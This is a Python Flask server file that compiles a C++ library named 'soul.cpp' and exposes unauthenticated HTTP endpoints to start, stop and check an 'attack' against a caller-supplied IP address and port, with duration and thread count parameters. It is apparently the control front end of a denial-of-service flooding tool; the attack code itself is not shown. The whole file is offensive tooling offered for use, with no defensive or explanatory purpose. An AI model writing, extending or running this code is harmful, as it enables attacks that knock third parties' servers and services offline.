import os
import subprocess
import ctypes
from flask import Flask, request, jsonify

app = Flask(__name__)

# ---------- Compile C++ lib if not exists ----------
def compile_lib():
    if os.path.exists("soul.so"):
        return
    print("Compiling soul.cpp -> soul.so ...")
    result = subprocess.run(
        ["g++", "-shared", "-fPIC", "-std=c++14", "-pthread", "-o", "soul.so", "soul.cpp"],
        capture_output=True, text=True
    )
    if result.returncode != 0:
        print("Compilation failed:", result.stderr)
        exit(1)
    print("Compilation successful.")

compile_lib()

# ---------- Load shared library ----------
lib = ctypes.CDLL("./soul.so")
lib.start_attack.argtypes = [ctypes.c_char_p, ctypes.c_int, ctypes.c_int, ctypes.c_int]
lib.start_attack.restype = ctypes.c_int
lib.stop_attack.argtypes = []
lib.stop_attack.restype = None
lib.is_attacking.argtypes = []
lib.is_attacking.restype = ctypes.c_int

# ---------- Routes ----------
@app.route('/attack/start', methods=['POST'])
def start_attack():
    data = request.get_json()
    if not data:
        return jsonify({"error": "Missing JSON body"}), 400
    ip = data.get('ip')
    port = data.get('port')
    duration = data.get('duration')
    threads = data.get('threads')
    if not all([ip, port, duration, threads]):
        return jsonify({"error": "Missing ip/port/duration/threads"}), 400
    try:
        port = int(port); duration = int(duration); threads = int(threads)
    except ValueError:
        return jsonify({"error": "port/duration/threads must be integers"}), 400
    res = lib.start_attack(ip.encode('utf-8'), port, duration, threads)
    if res == 0:
        return jsonify({"status": "Attack started"})
    elif res == -1:
        return jsonify({"error": "Attack already running"}), 409
    else:
        return jsonify({"error": "Thread creation failed"}), 500

@app.route('/attack/stop', methods=['POST'])
def stop_attack():
    lib.stop_attack()
    return jsonify({"status": "Attack stopped"})

@app.route('/attack/status', methods=['GET'])
def status():
    return jsonify({"attacking": bool(lib.is_attacking())})

@app.route('/health', methods=['GET'])
def health():
    return jsonify({"status": "alive"})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
